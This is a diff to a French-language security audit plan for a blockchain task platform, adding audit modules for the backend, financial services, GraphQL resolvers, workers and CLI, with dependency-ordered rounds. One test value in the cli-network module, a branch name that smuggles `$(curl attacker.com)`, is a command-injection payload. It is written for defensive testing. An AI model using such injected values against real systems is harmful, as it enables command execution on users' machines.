@@ -1517,29 +1517,135 @@ const complexityRule = createComplexityRule({ maximumComplexity: 100, ... });
 
 ---
 
+#### MODULE : `backend-chain-adapter`
+**Périmètre :** couche BAL — circuit breaker, fallback RPC, toutes les méthodes on-chain  
+**Fichiers :** `evm.adapter.base.ts`, `polygon.adapter.ts`, `ethereum.adapter.ts`, `chain.registry.ts`, `chain.adapter.ts`  
+**Déclencheur :** modification d'un adapter OU avant testnet  
+**Dépendances :** aucune  
+**Critère de sortie :** 0 finding Critical/High
+
+**Questions clés :**
+- Circuit breaker : si le primaire est OPEN et le fallback aussi échoue, l'erreur est-elle correctement propagée sans état DB incohérent ?
+- `rpc<T>(primary, fallback?)` : si `primary` réussit mais que son résultat est invalide (tx hash vide, zéro hash), est-ce détecté ?
+- `SIGNER_PRIVATE_KEY` : présent dans `process.env` — est-il loggé quelque part accidentellement ? Vérifier tous les `console.log`, `console.error`, formatError.
+- `chainRegistry.get(chainId)` : que se passe-t-il si un resolver passe un chainId arbitraire fourni par le client ?
+- Toutes les méthodes on-chain (`claimTask`, `softLock`, `releaseTaskReward`, `executePunishment`) : les bytes32 sont-ils correctement padés ? Un taskId < 32 bytes peut-il créer une collision ?
+
+---
+
+#### MODULE : `backend-financial`
+**Périmètre :** services financiers — release reward, punitions, wallet verification  
+**Fichiers :** `escrow.service.ts`, `punishment.service.ts`, `wallet.service.ts`, `reputation.service.ts`  
+**Déclencheur :** modification d'un service financier OU avant testnet  
+**Dépendances :** `backend-chain-adapter`  
+**Critère de sortie :** 0 finding Critical/High
+
+**Questions clés :**
+- `escrow.service.ts` — `releaseTaskReward` : l'ownership check (callerAddress == projectOwner) est-il fait avant ou après la lecture DB ? Un TOCTOU est-il possible ?
+- `punishment.service.ts` — séquence burn on-chain + DB : si le burn réussit mais l'écriture DB échoue, les fonds sont brûlés sans trace. Compense-t-on ?
+- `punishment.service.ts` — `DEFAULT_PUNISHMENTS` : si le créateur n'a pas configuré de punitions, les valeurs par défaut sont-elles appliquées silencieusement ? Est-ce documenté ?
+- `wallet.service.ts` — `verifyWallet` : `signedNonce` est optionnel. Que se passe-t-il si absent ? `ownershipProven = false` est-il bloquant ou seulement un avertissement selon le contexte ?
+- `wallet.service.ts` — `softLock` : si l'appel on-chain réussit mais que la DB ne le reflète pas, le dev peut clamer une deuxième tâche (son solde DB paraît insuffisant).
+- `reputation.service.ts` — `applyDelta` : un delta négatif peut-il mettre le score en dessous de zéro on-chain ? Le contrat gère-t-il ça ?
+
+---
+
+#### MODULE : `backend-resolvers`
+**Périmètre :** couche GraphQL — auth guards, ownership checks, input validation  
+**Fichiers :** `task.resolver.ts`, `project.resolver.ts`, `wallet.resolver.ts`, `context.ts`  
+**Déclencheur :** modification d'un resolver OU avant testnet  
+**Dépendances :** aucune  
+**Critère de sortie :** 0 finding Critical/High
+
+**Questions clés :**
+- Chaque mutation : `assertAuthenticated` est-il appelé systématiquement ? Lister les mutations sans guard.
+- `validateSubmission` : le caller est passé comme `callerAddress` mais le service vérifie `project.ownerAddress`. Si le projet n'existe pas, que retourne le service ? Un resolver peut-il valider la soumission de n'importe qui si le projet est archivé ?
+- `releaseTaskReward` : double-check ownership dans le resolver ET dans le service. Lequel est autoritaire ? Peut-on contourner l'un des deux ?
+- `projects` query : les projets privés sont anonymisés dans `getPublicView` — vérifier que `mine: true` ne révèle pas les données réelles des projets privés d'autres owners.
+- `walletStatus` : pas de guard auth — n'importe qui peut interroger n'importe quelle adresse. Est-ce intentionnel ? Confirmer par rapport à la matrice d'accès.
+- Inputs non validés : `args.chain` est passé directement à `chainRegistry.get()` dans plusieurs resolvers. Un chainId forgé peut déclencher une erreur non gérée exposée au client.
+
+---
+
+#### MODULE : `backend-workers`
+**Périmètre :** workers asynchrones — réconciliation on-chain, expiration tâches  
+**Fichiers :** `reconciliation.worker.ts`, `timer.service.ts`, `deposit.worker.ts`  
+**Déclencheur :** modification d'un worker OU avant testnet  
+**Dépendances :** `backend-chain-adapter`, `backend-financial`  
+**Critère de sortie :** 0 finding Critical/High + crash-test à chaque étape
+
+**Questions clés :**
+- `reconciliation.worker.ts` — `reconcileStaleClaimPending` : rollback après 5min. Si le serveur a été arrêté 10min, des claims légitimes (on-chain confirmés mais pas encore réconciliés) peuvent-ils être rollbackés ?
+- `reconciliation.worker.ts` — `queryFilter` sur des milliers de blocs : timeout ? Rate limit RPC ? Que se passe-t-il si le RPC retourne une erreur partielle sur un batch de 2000 blocs ?
+- `timer.service.ts` — BullMQ repeatable job `deadline-alerts` : si deux instances démarrent en même temps, le job est-il créé deux fois (collision jobId) ou une seule fois ?
+- `timer.service.ts` — `concurrency: 10` sur le worker : 10 expirations simultanées peuvent déclencher 10 `softUnlock` en parallèle pour le même dev. Le contrat est-il idempotent sur `softUnlock` ?
+- `deposit.worker.ts` — stub : documenté comme non-fonctionnel. À quel moment sera-t-il activé ? Quel est le risque si des dépôts arrivent avant son activation ?
+
+---
+
+#### MODULE : `cli-keystore`
+**Périmètre :** sécurité clé privée locale — génération, chiffrement, signature  
+**Fichiers :** `cli/src/utils/keystore.ts`, `cli/src/commands/auth.ts`, `cli/src/commands/wallet.ts`  
+**Déclencheur :** modification de la gestion du keystore OU avant release CLI  
+**Dépendances :** aucune  
+**Critère de sortie :** 0 finding Critical/High
+
+**Questions clés :**
+- `unlockWallet` : la clé privée retournée en mémoire — combien de temps vit-elle avant d'être effacée ? `privateKey = ""` efface la variable locale mais pas forcément la mémoire V8 (GC non déterministe).
+- `createWallet` / `restoreWallet` : mode 0600 sur le fichier keystore. Si le répertoire `~/.ptf/keystore/` a des permissions trop larges, le mode fichier seul ne protège pas.
+- `signChallenge` : `wallet.signMessageSync(nonce)` — le nonce est une string arbitraire fournie par le serveur. Un nonce de la forme d'une transaction EIP-712 peut-il tromper l'utilisateur (phishing) ?
+- `listLocalWallets` : retourne toutes les adresses en clair dans la réponse CLI. Loggué quelque part ?
+- `addressFromPublicKey` : fonction jamais appelée — dead code ou prévu ? Si utilisée, vérifier que `keccak256(pubkey)[12:]` est correct (Ethereum standard).
+- `wallet delete` sans confirmation seed phrase : l'utilisateur peut supprimer son keystore sans prouver qu'il a la seed phrase. Perte irréversible si pas de backup.
+
+---
+
+#### MODULE : `cli-network`
+**Périmètre :** communication réseau CLI — appels API, vérification hash, injection shell  
+**Fichiers :** `cli/src/utils/api.ts`, `cli/src/utils/shell.ts`, `cli/src/commands/submit.ts`, `cli/src/commands/commit.ts`, `cli/src/utils/tracker.ts`, `cli/src/utils/config.ts`  
+**Déclencheur :** modification des utilitaires réseau ou shell OU avant release CLI  
+**Dépendances :** aucune  
+**Critère de sortie :** 0 finding Critical/High
+
+**Questions clés :**
+- `shellEscape` : couvre-t-il les noms de branches contenant des caractères spéciaux (`refs/heads/feat/$(cmd)`) ? Tester avec `ptf submit --branch "feat/$(curl attacker.com)"`.
+- `gitCmd(repoPath, args)` : `repoPath` vient du `tracker.json` local. Si un attaquant modifie ce fichier, peut-il injecter un chemin malveillant ?
+- `api.ts` — `resolveApiUrl()` : pas encore implémenté (hardcodé sur `ptfApiUrl`). Quand la node discovery sera ajoutée, vérifier que le nœud retourné est validé (attestation on-chain) avant d'être utilisé.
+- `api.ts` — vérification hash métadonnées : actuellement optionnelle. Pour les opérations financières (claim, publish), rendre obligatoire et documenter le comportement si le hash diverge.
+- `tracker.ts` — `~/.config/ptf/active-tasks.json` : fichier non chiffré contenant taskId, projectId, repoPath. Sensibilité ? Accessible à d'autres utilisateurs du système ?
+- `submit.ts` — `git push -u origin branch` : si `repoUrl` est contrôlé par l'utilisateur (cas 3 ptf-temp), un push vers un remote arbitraire est-il possible ?
+
+---
+
 ### Composition des rounds
 
 Les modules se composent selon le contexte. Un round = N modules lancés en parallèle ou en séquence selon leurs dépendances.
 
 ```
-ROUND IMMÉDIAT (maintenant, indépendants) :
-  backend-cache      ← NodeCacheService vient d'être ajouté
-  backend-http       ← corrections helmet/nonces/complexity pendantes
+ROUND IMMÉDIAT — démarrables maintenant (aucune dépendance) :
+  backend-cache          ← NodeCacheService jamais audité
+  backend-http           ← corrections helmet/nonces/complexity pendantes
+  backend-claim          ← claim_pending + rollback jamais audité
+  backend-chain-adapter  ← circuit breaker + fallback RPC jamais audité
+  backend-resolvers      ← guards GraphQL jamais audités
+  cli-keystore           ← chiffrement, seed phrase, signChallenge
+  cli-network            ← shellEscape, git push, tracker
 
-ROUND PRÉ-TESTNET (modules avec dépendances résolues) :
-  contracts-admin    ← bloquant testnet
-  contracts-metadata ← après contracts-admin
-  backend-claim      ← indépendant, peut démarrer en parallèle
-  backend-metadata   ← après contracts-metadata
+ROUND PRÉ-TESTNET — après dépendances directes résolues :
+  contracts-admin        ← bloquant testnet (multisig + timelock)
+  contracts-metadata     ← après contracts-admin
+  backend-metadata       ← après contracts-metadata
+  backend-financial      ← après backend-chain-adapter
+  backend-workers        ← après backend-financial + backend-chain-adapter
 
-ROUND TESTNET (sous charge réelle) :
-  load-behavior      ← après backend-claim + backend-cache
+ROUND TESTNET — sous charge réelle :
+  load-behavior          ← après backend-claim + backend-cache + backend-workers
 
-ROUND MAINNET (avant déploiement) :
-  escrow-final       ← dernier verrou avant fonds réels
+ROUND MAINNET — dernier verrou :
+  escrow-final           ← après tous les autres
 ```
 
-**Règle de composition :** deux modules sans dépendance entre eux s'exécutent en parallèle. Un module avec dépendance attend uniquement que ses dépendances directes aient leur critère de sortie — pas que le round entier soit terminé.
+**Règle de composition :** deux modules sans dépendance entre eux s'exécutent en parallèle. Un module attend uniquement que ses dépendances directes aient leur critère de sortie — pas que le round entier soit terminé.
 
 ---
 
@@ -1572,13 +1678,21 @@ Mois 2     : levée des limites si aucun incident
 
 | Module | Statut | Peut démarrer | Bloque |
 |---|---|---|---|
-| `backend-cache` | 🔴 À auditer | **Maintenant** | — |
+| `backend-cache` | 🔴 À auditer | **Maintenant** | `load-behavior` |
 | `backend-http` | 🔴 À corriger + auditer | **Maintenant** | — |
-| `contracts-admin` | 🔴 À corriger + auditer | Dès que disponible | Testnet |
 | `backend-claim` | 🔴 À auditer | **Maintenant** | `load-behavior` |
+| `backend-chain-adapter` | 🔴 À auditer | **Maintenant** | `backend-financial`, `backend-workers` |
+| `backend-resolvers` | 🔴 À auditer | **Maintenant** | — |
+| `cli-keystore` | 🔴 À auditer | **Maintenant** | Release CLI |
+| `cli-network` | 🔴 À auditer | **Maintenant** | Release CLI |
+| `contracts-admin` | 🔴 À corriger + auditer | Dès que disponible | Testnet |
 | `contracts-metadata` | 🔴 À auditer | Après `contracts-admin` | `backend-metadata` |
 | `backend-metadata` | 🔴 À auditer | Après `contracts-metadata` | Archivage Arweave |
-| `load-behavior` | 🔴 À planifier | Après `backend-claim` + `backend-cache` | Mainnet |
+| `backend-financial` | 🔴 À auditer | Après `backend-chain-adapter` | `backend-workers`, `escrow-final` |
+| `backend-workers` | 🔴 À auditer | Après `backend-financial` + `backend-chain-adapter` | `load-behavior` |
+| `load-behavior` | 🔴 À planifier | Après `backend-claim` + `backend-cache` + `backend-workers` | Mainnet |
 | `escrow-final` | 🔴 À planifier | Après tous les autres | **Mainnet** |
 
-**Critère de sortie universel pour tous les modules :** 0 finding Critical/High non corrigé avant de déverrouiller les modules dépendants.
+**Critère de sortie universel :** 0 finding Critical/High non corrigé avant de déverrouiller les modules dépendants.
+
+**Couverture complète :** 14 modules couvrent l'intégralité du périmètre — 4 contrats Solidity, 18 services/workers backend, 3 resolvers GraphQL, 10 commandes et utilitaires CLI.
